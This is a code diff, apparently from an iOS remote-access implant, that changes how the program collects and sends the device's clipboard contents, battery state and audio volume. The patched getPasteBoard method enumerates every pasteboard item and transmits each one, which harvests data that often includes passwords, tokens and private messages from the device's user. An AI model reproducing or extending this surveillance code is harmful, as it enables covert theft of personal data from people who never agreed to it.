@@ -246,25 +246,32 @@ bool sysTaskRunning = false;
 
 - (void)getPasteBoard {
     UIPasteboard* pb = [UIPasteboard generalPasteboard];
-    NSString* contents = pb.string;
-    if (contents == nil) {
-        [self sendString:@"nil"];
+    if([pb.strings count] > 1){
+        [self sendString:[NSString stringWithFormat:@"[*] Found a total of %lu items on the pasteboard\n", [pb.strings count]]];
+        NSUInteger count = 0;
+        for (NSString* pstring in pb.strings){
+            [self sendString:[NSString stringWithFormat:@"%lu. '%@'\n", count, pstring]];
+            count++;
+        }
+    } else if ([pb.strings count] == 1){
+        [self sendString:[NSString stringWithFormat:@"[*] Pasteboard: '%@'", [pb.strings firstObject]]];
+    } else if ([pb.strings count] == 0){
+        [self sendString:[NSString stringWithFormat:@"[*] No items found on pasteboard! (%@)", pb.strings]];
     }
-    [self sendString:contents];
     [self term];
 }
 
 - (void)getBattery {
-    int batinfo = ([_thisUIDevice batteryLevel] * 100);
-    [self sendString:[NSString stringWithFormat:@"Battery Level: %d ", batinfo]];
+    int batteryLevelLocal = ([_thisUIDevice batteryLevel] * 100);
+    [self sendString:[NSString stringWithFormat:@"Battery Level: %d%%\nDevice is%@charging", batteryLevelLocal, [_thisUIDevice batteryState] == UIDeviceBatteryStateCharging ? @" " : @" not "]];
     [self term];
 }
 
 - (void)getVolume {
-  [[AVAudioSession sharedInstance] setActive:YES error:nil];
-  [[AVAudioSession sharedInstance] addObserver:self forKeyPath:@"outputVolume" options:NSKeyValueObservingOptionNew context:nil];
-  [self sendString:[NSString stringWithFormat:@"%.2f", [AVAudioSession sharedInstance].outputVolume]];
-  [self term];
+    [[AVAudioSession sharedInstance] setActive:YES error:nil];
+    [[AVAudioSession sharedInstance] addObserver:self forKeyPath:@"outputVolume" options:NSKeyValueObservingOptionNew context:nil];
+    [self sendString:[NSString stringWithFormat:@"%.2f", [AVAudioSession sharedInstance].outputVolume]];
+    [self term];
 }
 
 - (void)setVolume:(NSString*)args {
